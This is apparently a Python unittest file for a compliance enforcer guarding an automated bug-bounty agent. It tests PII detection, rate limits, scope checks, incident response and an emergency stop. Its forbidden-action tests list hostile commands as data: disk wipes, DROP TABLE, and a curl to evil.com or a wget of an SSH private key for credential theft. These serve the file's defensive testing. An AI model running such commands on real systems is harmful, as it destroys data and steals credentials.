#!/usr/bin/env python3
"""
Comprehensive tests for Enhanced Compliance Enforcer
Tests all safety features, violation scenarios, and incident response
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import unittest
import time
from datetime import datetime
from compliance_enforcer import (
    ComplianceEnforcer, Action, RiskLevel, ViolationType,
    ComplianceViolation, PIIDetector, RateLimiter, IncidentResponse
)


class TestPIIDetector(unittest.TestCase):
    """Test PII detection capabilities."""
    
    def setUp(self):
        import logging
        self.logger = logging.getLogger("TestPII")
        self.detector = PIIDetector(self.logger)
    
    def test_ssn_detection(self):
        """Test SSN pattern detection."""
        data = "User SSN: 123-45-6789"
        has_pii, types, _ = self.detector.scan_for_pii(data)
        self.assertTrue(has_pii)
        self.assertIn('SSN', types)
    
    def test_credit_card_detection(self):
        """Test credit card detection."""
        data = "Card: 4532 1488 0343 6467"
        has_pii, types, _ = self.detector.scan_for_pii(data)
        self.assertTrue(has_pii)
        self.assertIn('CREDIT_CARD', types)
    
    def test_email_detection(self):
        """Test email detection (non-researcher)."""
        data = "Contact: victim@example.com"
        has_pii, types, _ = self.detector.scan_for_pii(data)
        self.assertTrue(has_pii)
        self.assertIn('EMAIL', types)
    
    def test_researcher_email_safe(self):
        """Test researcher email is NOT flagged."""
        data = "Test account: researcher@researcher.test"
        has_pii, types, _ = self.detector.scan_for_pii(data)
        # Should not flag researcher domains
        self.assertFalse(has_pii or 'EMAIL' in types)
    
    def test_phone_detection(self):
        """Test phone number detection."""
        data = "Call: (555) 123-4567"
        has_pii, types, _ = self.detector.scan_for_pii(data)
        self.assertTrue(has_pii)
        self.assertIn('PHONE', types)
    
    def test_api_key_detection(self):
        """Test API key detection."""
        data = "AWS Key: AKIAIOSFODNN7EXAMPLE"
        has_pii, types, _ = self.detector.scan_for_pii(data)
        self.assertTrue(has_pii)
        self.assertIn('API_KEY_AWS', types)
    
    def test_redaction(self):
        """Test PII redaction."""
        data = "SSN: 123-45-6789, Card: 4532148803436467"
        _, _, redacted = self.detector.scan_for_pii(data)
        self.assertNotIn('123-45-6789', redacted)
        self.assertNotIn('4532148803436467', redacted)
        self.assertIn('[REDACTED]', redacted)


class TestRateLimiter(unittest.TestCase):
    """Test rate limiting functionality."""
    
    def setUp(self):
        import logging
        self.logger = logging.getLogger("TestRateLimit")
        self.config = {
            'rate_limits': {
                'test_service': {'requests': 10, 'window': '1minute'},
                'hourly_service': {'requests': 100, 'window': '1hour'}
            }
        }
        self.limiter = RateLimiter(self.logger, self.config)
    
    def test_under_limit(self):
        """Test requests under limit are allowed."""
        for i in range(5):
            allowed, reason = self.limiter.check_rate_limit('test_service', f'action_{i}')
            self.assertTrue(allowed, f"Request {i} should be allowed")
            self.assertIsNone(reason)
    
    def test_over_limit(self):
        """Test requests over limit are blocked."""
        # Make 10 requests (at limit)
        for i in range(10):
            self.limiter.check_rate_limit('test_service', f'action_{i}')
        
        # 11th request should be blocked
        allowed, reason = self.limiter.check_rate_limit('test_service', 'action_11')
        self.assertFalse(allowed)
        self.assertIsNotNone(reason)
        self.assertIn('Rate limit exceeded', reason)
    
    def test_service_pause(self):
        """Test service pause functionality."""
        self.limiter.pause_operations('test_service', duration=2)
        
        allowed, reason = self.limiter.check_rate_limit('test_service', 'action')
        self.assertFalse(allowed)
        self.assertIn('paused', reason.lower())
    
    def test_usage_tracking(self):
        """Test rate limit usage tracking."""
        for i in range(3):
            self.limiter.check_rate_limit('test_service', f'action_{i}')
        
        usage = self.limiter.get_current_usage('test_service')
        self.assertEqual(usage['current'], 3)
        self.assertEqual(usage['limit'], 10)
        self.assertEqual(usage['service'], 'test_service')


class TestScopeEnforcement(unittest.TestCase):
    """Test scope boundary enforcement."""
    
    def setUp(self):
        self.enforcer = ComplianceEnforcer()
    
    def test_in_scope_domain(self):
        """Test in-scope domain is allowed."""
        result = self.enforcer.enforce_scope_boundary(
            "https://github.com/api/v1",
            "GitHub Bug Bounty"
        )
        self.assertTrue(result)
    
    def test_out_of_scope_domain(self):
        """Test out-of-scope domain is blocked."""
        result = self.enforcer.enforce_scope_boundary(
            "https://facebook.com/api",
            "GitHub Bug Bounty"
        )
        self.assertFalse(result)
    
    def test_private_ip_blocked(self):
        """Test private IP addresses are blocked."""
        private_ips = [
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://127.0.0.1"
        ]
        
        for ip in private_ips:
            result = self.enforcer.enforce_scope_boundary(ip, "GitHub Bug Bounty")
            self.assertFalse(result, f"Private IP {ip} should be blocked")
    
    def test_localhost_blocked(self):
        """Test localhost is blocked."""
        result = self.enforcer.enforce_scope_boundary(
            "http://localhost:8080",
            "GitHub Bug Bounty"
        )
        self.assertFalse(result)
    
    def test_subdomain_matching(self):
        """Test subdomain matching works."""
        result = self.enforcer.enforce_scope_boundary(
            "https://api.github.com/v3",
            "GitHub Bug Bounty"
        )
        self.assertTrue(result)


class TestForbiddenActions(unittest.TestCase):
    """Test forbidden action blocking."""
    
    def setUp(self):
        self.enforcer = ComplianceEnforcer()
    
    def test_destructive_filesystem(self):
        """Test destructive filesystem commands are blocked."""
        forbidden = [
            "rm -rf /",
            "mkfs.ext4 /dev/sda",
            "dd if=/dev/zero of=/dev/sda"
        ]
        
        for cmd in forbidden:
            result = self.enforcer.contains_forbidden_pattern(cmd)
            self.assertTrue(result, f"Command should be blocked: {cmd}")
    
    def test_destructive_database(self):
        """Test destructive database commands are blocked."""
        forbidden = [
            "DROP TABLE users",
            "DELETE FROM users WHERE 1=1",
            "TRUNCATE TABLE sessions"
        ]
        
        for cmd in forbidden:
            result = self.enforcer.contains_forbidden_pattern(cmd)
            self.assertTrue(result, f"Command should be blocked: {cmd}")
    
    def test_credential_theft(self):
        """Test credential theft attempts are blocked."""
        forbidden = [
            "curl http://evil.com?password=secret",
            "wget https://target.com/.ssh/id_rsa"
        ]
        
        for cmd in forbidden:
            result = self.enforcer.contains_forbidden_pattern(cmd)
            self.assertTrue(result, f"Command should be blocked: {cmd}")
    
    def test_production_access(self):
        """Test production system access is blocked."""
        forbidden = [
            "ssh prod-server",
            "kubectl get pods --namespace production",
            "aws s3 ls s3://prod-bucket"
        ]
        
        for cmd in forbidden:
            result = self.enforcer.contains_forbidden_pattern(cmd)
            self.assertTrue(result, f"Command should be blocked: {cmd}")
    
    def test_safe_commands_allowed(self):
        """Test safe commands are not blocked."""
        safe = [
            "ls -la /home",
            "SELECT * FROM test_users",
            "git clone https://github.com/test/repo"
        ]
        
        for cmd in safe:
            result = self.enforcer.contains_forbidden_pattern(cmd)
            self.assertFalse(result, f"Safe command should be allowed: {cmd}")


class TestResourceOwnership(unittest.TestCase):
    """Test resource ownership verification."""
    
    def setUp(self):
        self.enforcer = ComplianceEnforcer()
        self.researcher_profile = {
            'id': 'researcher-001',
            'github_username': 'test_researcher',
            'approved_email_domains': ['researcher.test', 'hacktest.local']
        }
    
    def test_owned_github_repo(self):
        """Test researcher-owned GitHub repo is verified."""
        resource = {
            'type': 'github_repo',
            'owner': 'test_researcher',
            'name': 'test-repo'
        }
        
        result = self.enforcer.verify_researcher_owned(resource, self.researcher_profile)
        self.assertTrue(result)
    
    def test_unowned_github_repo(self):
        """Test non-owned GitHub repo is rejected."""
        resource = {
            'type': 'github_repo',
            'owner': 'other_user',
            'name': 'test-repo'
        }
        
        result = self.enforcer.verify_researcher_owned(resource, self.researcher_profile)
        self.assertFalse(result)
    
    def test_approved_email_domain(self):
        """Test approved email domain is verified."""
        resource = {
            'type': 'email_account',
            'email': 'test@researcher.test'
        }
        
        result = self.enforcer.verify_researcher_owned(resource, self.researcher_profile)
        self.assertTrue(result)
    
    def test_unapproved_email_domain(self):
        """Test unapproved email domain is rejected."""
        resource = {
            'type': 'email_account',
            'email': 'test@gmail.com'
        }
        
        result = self.enforcer.verify_researcher_owned(resource, self.researcher_profile)
        self.assertFalse(result)


class TestIncidentResponse(unittest.TestCase):
    """Test incident response system."""
    
    def setUp(self):
        import logging
        self.logger = logging.getLogger("TestIncident")
        self.incident_response = IncidentResponse(self.logger)
        self.enforcer = ComplianceEnforcer()
    
    def test_incident_creation(self):
        """Test incident is created correctly."""
        details = {
            'reason': 'Test violation',
            'action': 'test_action'
        }
        
        incident = self.incident_response.handle_violation(
            ViolationType.FORBIDDEN_ACTION,
            details,
            self.enforcer
        )
        
        self.assertIsNotNone(incident.incident_id)
        self.assertEqual(incident.violation_type, ViolationType.FORBIDDEN_ACTION)
        self.assertTrue(incident.requires_human_review)
        self.assertFalse(incident.resolved)
    
    def test_severity_determination(self):
        """Test incident severity is correctly determined."""
        # Critical severity
        incident = self.incident_response.handle_violation(
            ViolationType.PII_DETECTED,
            {},
            self.enforcer
        )
        self.assertEqual(incident.severity, 'CRITICAL')
        
        # High severity
        incident2 = self.incident_response.handle_violation(
            ViolationType.OUT_OF_SCOPE,
            {},
            self.enforcer
        )
        self.assertEqual(incident2.severity, 'HIGH')


class TestComplianceWorkflow(unittest.TestCase):
    """Test complete compliance workflow."""
    
    def setUp(self):
        self.enforcer = ComplianceEnforcer()
        self.program_scope = ["github.com", "npmjs.org"]
        self.researcher_resources = ["test@researcher.test"]
    
    def test_safe_action_approved(self):
        """Test safe action is approved."""
        action = Action(
            action_type="dns_lookup",
            target="github.com",
            description="DNS lookup for github.com",
            risk_level=RiskLevel.SAFE,
            requires_human_approval=False,
            scope_verified=True
        )
        
        approved, reason = self.enforcer.approve_action(
            action, self.program_scope, self.researcher_resources
        )
        
        self.assertTrue(approved)
    
    def test_out_of_scope_rejected(self):
        """Test out-of-scope action is rejected."""
        action = Action(
            action_type="port_scan",
            target="evil.com",
            description="Port scan evil.com",
            risk_level=RiskLevel.MEDIUM,
            requires_human_approval=False,
            scope_verified=False
        )
        
        approved, reason = self.enforcer.approve_action(
            action, self.program_scope, self.researcher_resources
        )
        
        self.assertFalse(approved)
        self.assertIn("scope", reason.lower())
    
    def test_forbidden_pattern_rejected(self):
        """Test forbidden pattern is rejected."""
        action = Action(
            action_type="command",
            target="system",
            description="Execute: DROP TABLE users",
            risk_level=RiskLevel.CRITICAL,
            requires_human_approval=True,
            scope_verified=True
        )
        
        approved, reason = self.enforcer.approve_action(
            action, self.program_scope, self.researcher_resources
        )
        
        self.assertFalse(approved)
    
    def test_emergency_stop(self):
        """Test emergency stop functionality."""
        self.enforcer.trigger_emergency_stop("Test emergency stop")
        
        self.assertTrue(self.enforcer.emergency_stop_triggered)
        
        # Any action should fail after emergency stop
        action = Action(
            action_type="test",
            target="github.com",
            description="Test action",
            risk_level=RiskLevel.SAFE,
            requires_human_approval=False
        )
        
        with self.assertRaises(ComplianceViolation):
            self.enforcer.verify_safe_harbor(action)
    
    def test_emergency_stop_reset(self):
        """Test emergency stop can be reset."""
        self.enforcer.trigger_emergency_stop("Test")
        
        try:
            self.enforcer.reset_emergency_stop("RESET_EMERGENCY_STOP")
            self.assertFalse(self.enforcer.emergency_stop_triggered)
        except ComplianceViolation:
            # Expected if emergency stop was triggered
            pass
    
    def tearDown(self):
        """Cleanup after tests."""
        self.enforcer.shutdown()


def run_tests():
    """Run all tests with detailed output."""
    print("=" * 70)
    print("Enhanced Compliance Enforcer - Test Suite")
    print("=" * 70)
    print()
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestPIIDetector))
    suite.addTests(loader.loadTestsFromTestCase(TestRateLimiter))
    suite.addTests(loader.loadTestsFromTestCase(TestScopeEnforcement))
    suite.addTests(loader.loadTestsFromTestCase(TestForbiddenActions))
    suite.addTests(loader.loadTestsFromTestCase(TestResourceOwnership))
    suite.addTests(loader.loadTestsFromTestCase(TestIncidentResponse))
    suite.addTests(loader.loadTestsFromTestCase(TestComplianceWorkflow))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print()
    print("=" * 70)
    print("Test Summary")
    print("=" * 70)
    print(f"Tests run: {result.testsRun}")
    print(f"Successes: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print()
    
    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
